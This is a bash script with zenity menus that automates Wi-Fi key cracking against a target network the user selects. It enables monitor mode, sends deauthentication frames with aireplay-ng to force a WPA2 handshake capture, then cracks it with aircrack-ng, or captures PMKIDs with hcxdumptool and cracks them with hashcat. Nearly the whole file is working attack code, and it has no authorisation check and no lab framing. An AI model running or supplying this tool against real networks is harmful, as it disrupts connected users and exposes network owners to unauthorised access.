#!/bin/bash


# Function to run GUI dialogs
function ask_input() {
    zenity --entry --title="$1" --text="$2"
}

function show_info() {
    zenity --info --title="$1" --text="$2"
}

function show_error() {
    zenity --error --title="Error" --text="$1"
}

# Select wireless interface
iface=$(ask_input "Wireless Interface" "Enter your wireless interface (e.g., wlan0):") || exit
if [[ -z "$iface" ]]; then show_error "No interface provided."; exit; fi

# Kill interfering processes and enable monitor mode
airmon-ng check kill
airmon-ng start "$iface"
mon_iface="${iface}mon"

# Main menu
attack=$(zenity --list --title="Wi-Fi Attack Menu" --radiolist \
  --column "Select" --column "Attack Type" \
  TRUE "WPA2 Handshake Attack" FALSE "PMKID Attack" \
  --width=400 --height=200) || exit

if [[ "$attack" == "WPA2 Handshake Attack" ]]; then

    show_info "Network Scan" "Airodump will now open. Close it after identifying your target."

    gnome-terminal -- airodump-ng "$mon_iface"
    
    bssid=$(ask_input "Target BSSID" "Enter target BSSID (e.g., 11:22:33:44:55:66):") || exit
    channel=$(ask_input "Channel" "Enter the target network's channel:") || exit
    wordlist=$(zenity --file-selection --title="Select a wordlist file") || exit

    gnome-terminal -- bash -c "
      airodump-ng -c $channel --bssid $bssid -w handshake $mon_iface & sleep 5
      aireplay-ng --deauth 10 -a $bssid $mon_iface
      sleep 20
      pkill airodump-ng
      aircrack-ng -w $wordlist -b $bssid handshake-01.cap;
      read -p 'Press Enter to exit...'
    "

elif [[ "$attack" == "PMKID Attack" ]]; then

    wordlist=$(zenity --file-selection --title="Select a wordlist file") || exit

    show_info "Capturing PMKID" "PMKID capture will start. Press Ctrl+C in the terminal when done."

    gnome-terminal -- bash -c "
      hcxdumptool -i $mon_iface -o pmkid.pcapng --enable_status=1;
      hcxpcapngtool -o pmkid_hash.txt pmkid.pcapng;
      hashcat -m 16800 -a 0 pmkid_hash.txt '$wordlist';
      read -p 'Press Enter to exit...'
    "

else
    show_error "Invalid selection."
fi

# Cleanup
airmon-ng stop "$mon_iface"
systemctl restart NetworkManager
show_info "Done" "Attack completed and interface restored."
